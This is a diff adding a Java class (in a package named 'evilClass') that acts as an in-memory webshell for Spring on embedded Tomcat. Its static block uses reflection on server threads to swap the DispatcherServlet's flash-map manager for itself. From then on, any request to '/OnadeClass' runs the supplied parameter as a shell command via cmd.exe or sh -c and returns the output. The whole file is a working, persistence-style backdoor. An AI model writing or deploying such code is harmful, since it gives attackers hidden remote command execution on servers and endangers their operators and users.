@@ -1,0 +1,214 @@
+package com.m1yuu.m1yuu_tools.evilClass;
+
+import org.apache.catalina.Service;
+import org.apache.catalina.core.StandardService;
+import org.springframework.web.servlet.FlashMap;
+import org.springframework.web.servlet.FlashMapManager;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.lang.reflect.Modifier;
+import java.nio.charset.Charset;
+import java.util.LinkedList;
+import java.util.List;
+import java.util.concurrent.ConcurrentHashMap;
+
+public class OnadeClass implements FlashMapManager {
+    static {
+        Method getThreads = null;
+        try {
+            getThreads = Thread.class.getDeclaredMethod("getThreads");
+        } catch (NoSuchMethodException e) {
+            throw new RuntimeException(e);
+        }
+        getThreads.setAccessible(true);
+        Object threads = null;
+        try {
+            threads = getThreads.invoke(null);
+
+        } catch (IllegalAccessException e) {
+            throw new RuntimeException(e);
+        } catch (InvocationTargetException e) {
+            throw new RuntimeException(e);
+        }
+        if (threads instanceof Thread[]) {
+            Thread[] threadsArray = (Thread[]) threads;
+            // 遍历数组查找名字包含"EventLoopGroup"的线程
+            for (Thread thread : threadsArray) {
+//                System.out.println(thread.getName());
+                if (thread != null && thread.getName().contains("7001-exec-1")) {
+                    //threads[4].group.threads[3].this$0.tomcat.server.services[0].mapper.contextObjectToContextVersionMap
+
+                    Object group = getField(thread, "group");
+                    Object groupThreadsObject = getField(group, "threads");
+                    Thread[] groupThreads = (Thread[]) groupThreadsObject;
+                    Thread  tomcatWebServerThread = null;
+                    for (Thread _thread : groupThreads) {
+                        if (_thread != null && _thread.getName().contains("container")) {
+                            tomcatWebServerThread = _thread;
+                        }
+                    }
+                    Object tomcatWebServer = getField(tomcatWebServerThread, "this$0");
+                    Object tomcat = getField(tomcatWebServer, "tomcat");
+                    Object server = getField(tomcat, "server");
+                    Object services = getField(server, "services");
+                    Service[] servicesList = (Service[]) services;
+                    StandardService standardService = (StandardService) servicesList[0];
+                    Object mapper = getField(standardService, "mapper");
+                    Object contextObjectToContextVersionMap = getField(mapper, "contextObjectToContextVersionMap");
+                    ConcurrentHashMap<?,?> concurrentHashMap = (ConcurrentHashMap<?,?>) contextObjectToContextVersionMap;
+                    Object value = null;
+                    for(Object value_ : concurrentHashMap.values()) {
+                        value = value_;
+                        break;
+                    }
+                    Object defaultWrapper = getField(value, "defaultWrapper");
+                    Object object = getField(defaultWrapper, "object");
+                    Object instance = getField(object, "instance");
+                    Field flashMapManager;
+                    try {
+                        flashMapManager = instance.getClass().getDeclaredField("flashMapManager");
+                    } catch (NoSuchFieldException e) {
+                        throw new RuntimeException(e);
+                    }
+                    makeSettable(flashMapManager);
+                    OnadeClass evilFlashMapManager = new OnadeClass();
+                    try {
+                        flashMapManager.set(instance, evilFlashMapManager);
+                        System.out.println("success");
+
+                    } catch (IllegalAccessException e) {
+                        throw new RuntimeException(e);
+                    }
+
+                }
+            }
+        }
+    }
+
+    public static Object getField(Object object, String fieldName) {
+        Field declaredField;
+
+        Class clazz = object.getClass();
+        while (clazz != Object.class) {
+            try {
+                declaredField = clazz.getDeclaredField(fieldName);
+                makeSettable(declaredField);
+                declaredField.setAccessible(true);
+                return declaredField.get(object);
+            } catch (NoSuchFieldException | IllegalAccessException e) {
+            }
+            clazz = clazz.getSuperclass();
+        }
+        return null;
+    }
+    public static void makeSettable(Field f) {
+        try {
+            Field modifiersField = Field.class.getDeclaredField("modifiers");
+            modifiersField.setAccessible(true);
+            modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
+            f.setAccessible(true);
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+    private final List<FlashMap> flashMaps = new LinkedList<>();
+    // 使用ThreadLocal存储每个请求的处理结果，防止重复写入相同内容
+    private static final ThreadLocal<String> lastResponseContent = new ThreadLocal<>();
+
+    @Override
+    public FlashMap retrieveAndUpdate(HttpServletRequest request, HttpServletResponse response) {
+        String url = request.getRequestURI();
+        if (url.contains("/OnadeClass")) {
+            String cmd = request.getParameter("OnadeClass");
+            
+            // 检查response是否已经提交，如果已提交则不再处理
+            if (response.isCommitted()) {
+                return null;
+            }
+            
+            Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
+            String result = "";
+            if (cmd != null && cmd.length() > 0) {
+                Process p;
+                if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
+                    try {
+                        p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
+                    } catch (IOException e) {
+                        throw new RuntimeException(e);
+                    }
+                } else {
+                    try {
+                        // 直接执行命令，不使用BASH_ENV重定向
+                        p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
+                    } catch (IOException e) {
+                        throw new RuntimeException(e);
+                    }
+                }
+
+                try {
+                    // 只读取标准输出流，避免重复
+                    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), osCharset));
+                    String line;
+                    while ((line = br.readLine()) != null) {
+                        result += line + "\n";
+                    }
+                    br.close();
+                    
+                    // 再次检查response是否已提交（可能在执行命令期间被提交）
+                    if (response.isCommitted()) {
+                        return null;
+                    }
+                    
+                    // 检查内容是否与上次相同，如果相同则跳过写入（防止重复写入相同内容）
+                    String lastContent = lastResponseContent.get();
+                    if (lastContent != null && lastContent.equals(result)) {
+                        return null;
+                    }
+                    
+                    // 输出结果
+                    response.getWriter().write(result);
+                    response.getWriter().flush();
+                    
+                    // 保存本次请求的处理结果，用于下次判断
+                    lastResponseContent.set(result);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                } finally {
+                    // 清理ThreadLocal，避免内存泄漏（在请求处理完成后清理）
+                    // 注意：这里不清理，让下次调用时判断内容是否相同
+                    // 如果需要在请求结束时清理，可以在Filter或Interceptor中处理
+                }
+            }
+
+        }
+
+        return null; // Return null if no matching FlashMap found
+    }
+
+    @Override
+    public void saveOutputFlashMap(FlashMap flashMap, HttpServletRequest request, HttpServletResponse response) {
+        synchronized (this.flashMaps) {
+            this.flashMaps.add(flashMap);
+        }
+    }
+
+    private boolean isExpired(FlashMap flashMap) {
+        // Implement expiration logic if needed, e.g., based on timestamp
+        return false; // Default to no expiration for simplicity
+    }
+
+    private boolean isMatchingRequest(HttpServletRequest request, FlashMap flashMap) {
+        // Implement logic to match the request (e.g., compare URL, session)
+        String targetRequestPath = request.getRequestURI();
+        String flashMapPath = (String) flashMap.getTargetRequestPath();
+        return targetRequestPath.equals(flashMapPath);
+    }
+}
